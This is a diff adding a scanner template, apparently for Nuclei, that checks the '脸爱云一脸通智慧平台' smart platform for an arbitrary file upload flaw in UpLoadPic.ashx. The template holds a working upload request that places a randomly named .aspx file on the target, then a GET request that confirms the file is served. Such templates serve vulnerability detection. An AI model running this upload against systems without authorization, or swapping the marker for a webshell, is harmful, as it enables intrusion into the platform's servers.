@@ -1,0 +1,58 @@
+id: poc-yaml-lian-ai-yun-uploadpic-ashx-anyfile-upload
+info:
+  name: 脸爱云一脸通智慧平台 UpLoadPic.ashx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+http:
+  - raw:
+      - |
+        POST /UpLoadPic.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
+
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="action"
+
+        post
+
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="myPhoto"; filename="{{t1}}.aspx"
+        Content-Type: image/png
+
+        {{t2}}
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="oldName"
+
+        ------WebKitFormBoundarywt7cEu1eBdibB13u--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "images"
+    extractors:
+      - type: regex
+        part: body
+        name: path
+        regex:
+          - "/(?P<path>.*).aspx"
+  - raw:
+      - |
+        GET /{{path}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+variables:
+  t1: '{{rand_base(4)}}'
+  t2: '{{base64(t1)}}'
